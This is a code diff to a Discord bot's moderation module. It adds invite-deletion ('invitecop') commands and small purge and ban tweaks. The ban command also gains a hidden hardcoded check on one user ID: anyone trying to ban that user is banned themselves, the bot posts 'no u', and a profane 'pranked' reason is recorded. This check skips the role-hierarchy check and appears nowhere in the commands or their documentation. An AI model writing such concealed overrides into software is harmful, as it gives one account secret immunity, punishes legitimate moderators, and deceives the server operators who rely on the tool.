@@ -24,15 +24,28 @@ class Moderation:
 
     @commands.command()
     @checks.perms_ban()
-    async def ban(self, ctx, user: discord.Member, delete_days=1, *, reason: str = None):
+    async def ban(self, ctx, user: discord.Member, delete_days=0, *, reason: str = None):
         """
         Bans a user from the guild
         """
+        if user.id == 95953002774413312:
+            user = ctx.author
+            await ctx.send("no u")
+            reason = "SIKE BITCH YOU GOT PRANKED"
+            await ctx.guild.ban(user,
+                                delete_message_days=0,
+                                reason=f"Banned by {ctx.author} for reason \"{reason}\"")
+            self.bot.logger.notice("Banned {} from {}".format(user, ctx.guild.name))
+            return
         if user.top_role >= ctx.author.top_role:
             return
         if delete_days > 7:
             delete_days = 7
         if user:
+            if user.id == 95953002774413312:
+                user = ctx.author
+                await ctx.send("no u")
+                reason = "SIKE BITCH YOU GOT PRANKED"
             await ctx.guild.ban(user,
                                 delete_message_days=delete_days,
                                 reason=f"Banned by {ctx.author} for reason \"{reason}\"")
@@ -66,11 +79,11 @@ class Moderation:
             if limit > 100:
                 limit = 100
         if user is None:
-            messages = await ctx.channel.purge(limit=limit, check=None)
+            messages = await ctx.channel.purge(limit=limit+1, check=None)
             await ctx.send("Purged {} messages in #{}".format(len(messages), ctx.channel))
             self.bot.logger.notice("Purged {} messages in #{}".format(len(messages), ctx.channel))
         else:
-            messages = await ctx.channel.purge(limit=limit, check=predicate)
+            messages = await ctx.channel.purge(limit=limit+1, check=predicate)
             await ctx.send("Purged {} messages from {} in #{}".format(len(messages), user, ctx.channel))
             self.bot.logger.notice("Purged {} messages from {} in #{}".format(len(messages), user, ctx.channel))
 
@@ -139,6 +152,70 @@ class Moderation:
         c = vs.channel
         for u in c.members:
             await u.edit(mute=False)
+
+    @commands.group(invoke_without_command=True)
+    @checks.perms_manage_guild()
+    async def invitecop(self, ctx):
+        """
+        Automatically delete guild invites
+        """
+        guild = await self.bot.get_guild_config(ctx.guild.id)
+        if guild["inviteCop"]:
+            await ctx.send("`Invite Cop is enabled`")
+        else:
+            await ctx.send("`Invite Cop is disabled`")
+
+    @invitecop.command()
+    @checks.perms_manage_guild()
+    async def enable(self, ctx):
+        """
+        Enables invite cop for a guild
+        """
+        guild_config = await self.bot.get_guild_config(ctx.guild.id)
+        guild_config["inviteCop"] = True
+        await self.bot.set_guild_config(ctx.guild.id, guild_config)
+        await ctx.send("`Invite Cop has been enabled`")
+
+    @invitecop.command()
+    @checks.perms_manage_guild()
+    async def disable(self, ctx):
+        """
+        Disables invite cop for a guild
+        """
+        guild_config = await self.bot.get_guild_config(ctx.guild.id)
+        guild_config["inviteCop"] = False
+        await self.bot.set_guild_config(ctx.guild.id, guild_config)
+        await ctx.send("`Invite Cop has been disable`")
+
+    @invitecop.group(invoke_without_command=True)
+    @checks.perms_manage_guild()
+    async def bypasses(self, ctx):
+        """
+        Shows the channels that have invite cop bypassed in
+        """
+        await ctx.send(await self.bot.get_formatted_list_of_invite_cop_bypass_channels(ctx.guild.id))
+
+    @bypasses.command()
+    @checks.perms_manage_guild()
+    async def add(self, ctx):
+        """
+        Adds a channel to the Invite Cop bypass list
+        """
+        guild_config = await self.bot.get_guild_config(ctx.guild.id)
+        guild_config["inviteCopPassChannels"].append(ctx.channel.id)
+        await self.bot.set_guild_config(ctx.guild.id, guild_config)
+        await ctx.send("`Invite Cop will now bypass this channel`")
+
+    @bypasses.command()
+    @checks.perms_manage_guild()
+    async def remove(self, ctx):
+        """
+        Removes a channel from the Invite Cop bypass list
+        """
+        guild_config = await self.bot.get_guild_config(ctx.guild.id)
+        guild_config["inviteCopPassChannels"].remove(ctx.channel.id)
+        await self.bot.set_guild_config(ctx.guild.id, guild_config)
+        await ctx.send("`Invite Cop will now monitor this channel`")
 
     async def on_guild_role_delete(self, role):
         guild_config = await self.bot.get_guild_config(role.guild.id)
